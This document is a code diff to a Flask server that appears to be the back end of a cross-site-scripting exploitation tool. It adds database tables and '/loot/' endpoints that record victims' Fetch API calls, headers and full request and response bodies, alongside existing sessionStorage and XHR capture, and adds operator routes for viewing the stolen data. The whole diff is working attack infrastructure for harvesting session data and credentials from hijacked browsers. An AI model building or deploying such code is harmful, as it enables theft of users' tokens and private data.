@@ -135,7 +135,7 @@ class HtmlCode(db.Model):
     clientID  = db.Column(db.String(100), nullable=False)
     url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    code      = db.Column(db.Text)
+    code      = db.Column(db.Text, nullable=True)
     fileName  = db.Column(db.String(100), nullable=False)
 
 
@@ -222,8 +222,40 @@ class XhrSetHeader(db.Model):
 class XhrCall(db.Model):
     id           = db.Column(db.Integer, primary_key=True)
     clientID     = db.Column(db.String(100), nullable=False)
-    requestBody  = db.Column(db.String(100), nullable=False)
-    responseBody = db.Column(db.String(300), nullable=False)
+    requestBody  = db.Column(db.Text, nullable=True);
+    responseBody = db.Column(db.Text, nullable=True);
+    timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class FetchSetup(db.Model):
+    id        = db.Column(db.Integer, primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    method    = db.Column(db.String(100), nullable=False)
+    url       = db.Column(db.String(300), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class FetchHeader(db.Model):
+    id        = db.Column(db.Integer, primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    header    = db.Column(db.String(100), nullable=False)
+    value     = db.Column(db.String(300), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+class FetchCall(db.Model):
+    id           = db.Column(db.Integer, primary_key=True)
+    clientID     = db.Column(db.String(100), nullable=False)
+    requestBody  = db.Column(db.Text, nullable=True);
+    responseBody = db.Column(db.Text, nullable=True);
     timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
@@ -399,9 +431,10 @@ def addAdminUser():
 # Response header handling
 @app.after_request
 def afterRequestHeaders(response):
-    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    response.headers['X-Content-Type-Options']    = 'nosniff'
-    response.headers['X-Frame-Options']           = 'SAMEORIGIN'
+    response.headers['Strict-Transport-Security']   = 'max-age=31536000; includeSubDomains'
+    response.headers['X-Content-Type-Options']      = 'nosniff'
+    response.headers['X-Frame-Options']             = 'SAMEORIGIN'
+    # response.headers['Access-Control-Allow-Origin'] = '*'
 
     # Server header is set in main function
  
@@ -745,7 +778,7 @@ def recordSessionStorageEntry(identifier):
     # print("New sessionStorage data recorded from: " + identifier)
     lootDir = findLootDirectory(identifier)
     content = request.json 
-    sessionStorageKey = content['key']
+    sessionStorageKey   = content['key']
     sessionStorageValue = content['value']
     logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)
 
@@ -758,8 +791,8 @@ def recordSessionStorageEntry(identifier):
 
     # add to global event table
     db.session.refresh(newSessionStorage)
-    newEvent = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
-    eventType='SESSIONSTORAGE', eventID=newSessionStorage.id)
+    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
+    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
     db.session.add(newEvent)
     dbCommit()    
 
@@ -811,8 +844,8 @@ def recordXhrHeader(identifier):
 
     # add to global event table
     db.session.refresh(newXhrHeader)
-    newEvent = Event(clientID=identifier, timeStamp=newXhrHeader.timeStamp, 
-    eventType='XHRSETHEADER', eventID=newXhrHeader.id)
+    newEvent  = Event(clientID=identifier, timeStamp=newXhrHeader.timeStamp, 
+    eventType ='XHRSETHEADER', eventID=newXhrHeader.id)
     db.session.add(newEvent)
     dbCommit()    
 
@@ -837,14 +870,89 @@ def recordXhrCall(identifier):
 
     # add to global event table
     db.session.refresh(newXhrCall)
-    newEvent = Event(clientID=identifier, timeStamp=newXhrCall.timeStamp, 
-    eventType='XHRCALL', eventID=newXhrCall.id)
+    newEvent  = Event(clientID=identifier, timeStamp=newXhrCall.timeStamp, 
+    eventType ='XHRCALL', eventID=newXhrCall.id)
     db.session.add(newEvent)
     dbCommit()    
 
     return "ok", 200
 
 
+
+# Record Fetch API Setup
+@app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
+def recordFetchSetup(identifier):
+    print("## Recording Fetch setup event")
+    content = request.json 
+    method  = content['method']
+    url     = content['url']
+    logEvent(identifier, "Fetch Setup: " + method + ", " + url)
+
+    # Put it in the database
+    newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
+    db.session.add(newFetchSetup)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db.session.refresh(newFetchSetup)
+    newEvent  = Event(clientID=identifier, timeStamp=newFetchSetup.timeStamp, 
+    eventType ='FETCHSETUP', eventID=newFetchSetup.id)
+    db.session.add(newEvent)
+    dbCommit()    
+
+    return "ok", 200
+
+
+
+# Record Fetch API Header calls
+@app.route('/loot/fetchHeader/<identifier>', methods=['POST'])
+def recordFetchHeader(identifier):
+    print("## Recording Fetch Header event")
+    content = request.json 
+    header  = content['header']
+    value   = content['value']
+    logEvent(identifier, "Fetch Header: " + header + ", " + value)
+
+    # Put it in the database
+    newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
+    db.session.add(newFetchHeader)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db.session.refresh(newFetchHeader)
+    newEvent  = Event(clientID=identifier, timeStamp=newFetchHeader.timeStamp, 
+    eventType ='FETCHHEADER', eventID=newFetchHeader.id)
+    db.session.add(newEvent)
+    dbCommit()    
+
+    return "ok", 200
+
+
+# Record Fetch API calls
+@app.route('/loot/fetchCall/<identifier>', methods=['POST'])
+def recordFetchCall(identifier):
+    print("## Recording Fetch api call")
+    content      = request.json 
+    requestBody  = content['requestBody']
+    responseBody = content['responseBody']
+    logEvent(identifier, "Fetch API Call: " + requestBody + ", " + responseBody)
+
+    # Put it in the database
+    newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
+    db.session.add(newFetchCall)
+    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db.session.refresh(newFetchCall)
+    newEvent  = Event(clientID=identifier, timeStamp=newFetchCall.timeStamp, 
+    eventType ='FETCHCALL', eventID=newFetchCall.id)
+    db.session.add(newEvent)
+    dbCommit()    
+
+    return "ok", 200
 
 
 #***************************************************************************
@@ -1009,6 +1117,42 @@ def getClientXhrCall(key):
 
 
 
+@app.route('/api/clientFetchSetup/<key>', methods=['GET'])
+@login_required
+def getClientFetchSetup(key):
+    print("**** Fetching client fetch setup call...")
+    fetchSetup = FetchSetup.query.filter_by(id=key).first()
+
+    fetchSetupData = {'method':escape(fetchSetup.method), 'url':escape(fetchSetup.url)}
+
+    return jsonify(fetchSetupData)
+
+
+
+@app.route('/api/clientFetchHeader/<key>', methods=['GET'])
+@login_required
+def getClientFetchHeader(key):
+    print("**** Fetching client fetch api header call...")
+    fetchHeader = FetchHeader.query.filter_by(id=key).first()
+
+    fetchHeaderData = {'header':escape(fetchHeader.header), 'value':escape(fetchHeader.value)}
+
+    return jsonify(fetchHeaderData)
+
+
+
+@app.route('/api/clientFetchCall/<key>', methods=['GET'])
+@login_required
+def getClientFetchCall(key):
+    print("**** Fetching client xhr api call...")
+    fetchCall = FetchCall.query.filter_by(id=key).first()
+
+    fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}
+
+    return jsonify(fetchCallData)
+
+
+
 @app.route('/api/updateClientNotes/<key>', methods=['POST'])
 @login_required
 def setClientNotes(key):
@@ -1111,6 +1255,9 @@ if __name__ == '__main__':
                     XhrOpen.__table__.drop(db.engine)
                     XhrSetHeader.__table__.drop(db.engine)
                     XhrCall.__table__.drop(db.engine)
+                    FetchSetup.__table__.drop(db.engine)
+                    FetchHeader.__table__.drop(db.engine)
+                    FetchCall.__table__.drop(db.engine)
                     Event.__table__.drop(db.engine)
                     dbCommit()
 
